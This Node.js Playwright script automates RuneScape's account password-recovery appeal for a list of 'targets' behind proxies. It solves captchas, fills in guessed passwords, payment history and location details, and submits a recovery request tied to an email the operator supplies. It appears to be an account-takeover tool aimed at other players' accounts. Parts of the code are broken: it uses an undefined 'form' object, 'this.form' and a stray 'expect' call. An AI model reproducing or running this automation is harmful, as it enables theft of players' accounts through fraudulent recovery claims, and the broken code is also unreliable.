const { captcha, SolveCaptcha } = require("./captcha.js");

async function SendRequest(page, target) {
  await FirstPage(page, target);
  await SecondPage(page, target);
  await ThirdPage(page, target);
}
async function FirstPage(page, target) {
  try {
    await page.goto(
      "https://secure.runescape.com/m=accountappeal/passwordrecovery"
    );
    await page.waitForNavigation({ timeout: 2000 });
  } catch (error) {
    console.log(`Proxy down. Target: ${target.login} | Proxy: ${target.proxy}`);
    return;
  }
  await SolveCaptcha(page);
  await page.click("id=email");
  await page.fill("id=email", form.login);
  await page.click("id=passwordRecovery");
  await page.waitForLoadState("networkidle"); // This resolves after 'networkidle'
  await SolveCaptcha(page);
  await page.click("#l-vista__container > small > a");
  await SolveCaptcha(page);
  await page.click("#l-vista__container > p:nth-child(5) > a");
  await SolveCaptcha(page);
  await page.click("#reg_email");
}

// The form
async function SecondPage(page, target) {
  // Passwords
  await page.click("#add-password");
  await page.click("#password2");
  await page.click("#add-password");
  await page.click("#password3");
  try {
    await page.check("#norecoveries");
    const checked = await page.isChecked("#norecoveries");
    expect(checked).toBeTruthy();
  } catch (error) {
    // Do nothing, account has no recovery questions, it's normal.
  }

  // Payment
  await page.hover("#paymenttype");
  await page.type("#paymenttype", this.form.paymentMethod);
  await page.waitForSelector("#subslength");
  await page.hover("#subslength");
  await page.type("#subslength", this.form.subLength);
  await page.hover("#earliestsubsmonth");
  await page.type("#earliestsubsmonth", this.form.creationMonth);
  await page.hover("#earliestsubsyear");
  await page.type("#earliestsubsyear", this.form.creationYear);

  // Creation date
  await page.hover("#creationmonth");
  await page.type("#creationmonth", this.form.creationMonth);
  await page.hover("#creationyear");
  await page.type("#creationyear", this.form.creationYear);

  // Country and State
  await page.hover("#country_otherinfo");
  await page.type("#country_otherinfo", this.form.country);
  try {
    const statefield = page.locator("#state_otherinfo");
    await statefield.waitFor({ state: "attached", timeout: 800 });
    await page.hover("#state_otherinfo");
    await page.type("#state_otherinfo", this.form.state);
  } catch (error) {
    // Just catch, because target is not from usa, we can still continue.
  }

  // Fill the page
  await page.click("id=reg_email");
  await page.fill("id=reg_email", form.personalMail);
  await page.fill("id=reg_email_conf", form.personalMail);
  await page.fill("id=password1", form.pass1);
  await page.fill("id=password2", form.pass2);
  await page.fill("id=password3", form.pass3);
  await page.fill("id=email", form.paymentmail);
  await page.fill("id=postcode", form.zipcode);
  await page.fill("id=isp", form.isp);
  await page.click("#submit_button");
}
// The after form
async function ThirdPage(page, target) {
  await SolveCaptcha(page);
  await page.waitForLoadState("networkidle");
  console.log(`Recovery sent for ${form.login}`);
  await page.close();
}

module.exports = { SendRequest };
